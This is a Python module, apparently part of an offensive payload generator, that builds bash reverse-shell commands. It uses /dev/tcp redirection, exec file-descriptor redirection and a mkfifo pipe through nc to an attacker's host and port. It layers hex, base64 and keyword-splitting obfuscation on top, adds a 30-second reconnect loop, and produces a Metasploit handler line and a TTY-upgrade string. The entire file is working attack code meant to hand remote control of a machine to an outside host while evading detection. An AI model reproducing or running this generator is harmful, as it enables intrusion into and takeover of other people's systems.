import random
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult,
    TTY_UPGRADE, msf_handler, LISTENER_FMT,
)
from .obfuscate import bash_hex_encode, bash_base64_pipe, bash_split_keyword

_VARIANTS = ["dev_tcp", "exec_redirect", "mkfifo"]


class BashGenerator(ShellGenerator):
    language = "bash"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/bash"

        if variant == "dev_tcp":
            raw = self._dev_tcp(opts, shell, names)
        elif variant == "exec_redirect":
            raw = self._exec_redirect(opts, shell, names)
        else:
            raw = self._mkfifo(opts, shell, names)

        # Deep obfuscation layer: randomly pick a second-level technique
        if names:
            technique = random.choice(["hex", "base64", "split", "none"])
            if technique == "hex":
                raw = raw.replace(shell, bash_hex_encode(shell))
            elif technique == "base64" and variant != "mkfifo":
                raw = bash_base64_pipe(raw)
                variant = f"{variant}_b64"
            elif technique == "split":
                keyword = shell.split("/")[-1]
                setup, ref = bash_split_keyword(keyword)
                raw = f"{setup};{raw.replace(keyword, ref)}"

        cmd = f"while :; do {raw}; sleep 30; done" if opts.retry else raw

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_bash", opts.lhost, opts.lport),
        )

    def _dev_tcp(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
        return f"{shell} -i >& /dev/tcp/{opts.lhost}/{opts.lport} 0>&1"

    def _exec_redirect(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
        fd = random.choice([5, 3, 4, 6]) if names else 5
        return (
            f"exec {fd}<>/dev/tcp/{opts.lhost}/{opts.lport};"
            f"{shell} <&{fd} >&{fd} 2>&{fd}"
        )

    def _mkfifo(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
        pipe = self._var("f", names)
        return (
            f"rm -f /tmp/{pipe}; mkfifo /tmp/{pipe}; "
            f"cat /tmp/{pipe} | {shell} -i 2>&1 | nc {opts.lhost} {opts.lport} > /tmp/{pipe}"
        )
